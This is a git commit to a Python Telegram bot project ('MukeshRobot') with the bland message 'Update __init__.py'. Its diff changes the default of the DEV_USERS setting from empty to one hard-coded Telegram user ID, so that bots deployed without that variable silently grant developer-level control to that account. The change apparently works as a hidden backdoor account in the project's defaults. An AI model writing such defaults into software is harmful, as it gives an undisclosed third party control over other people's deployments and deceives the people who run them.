900b9a30965797b3fddcc3e1024e532d897815c8
ɴᴏᴏʙ - ᴍᴜᴋᴇsʜ <108251605+Noob-mukesh@users.noreply.github.com>
2023-04-19 15:08:37 +0530

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -69,7 +69,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
